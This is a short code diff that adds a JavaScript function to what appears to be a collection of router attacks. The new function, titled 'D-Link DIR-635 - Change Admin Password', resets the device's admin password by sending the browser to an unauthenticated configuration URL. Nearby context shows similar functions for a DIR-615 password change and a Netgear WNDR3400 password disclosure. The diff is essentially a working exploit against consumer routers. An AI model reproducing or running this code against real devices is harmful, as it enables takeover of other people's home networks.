@@ -477,6 +477,15 @@ function d615d3_changepass(ip)
 	document.location="http://"+ip+url;
 }
 
+// D-Link DIR-635 - Change Admin Password
+function d635_changepass(ip)
+{
+	ip = ip || "192.168.0.1";
+	password = prompt("New Password:");
+	url = "/Tools/Admin.shtml?config.password=" + password;
+	document.location="http://"+ip+url;
+}
+
 // Netgear WNDR3400 - Password Disclosure
 function wndr3400_disclosure(ip)
 {
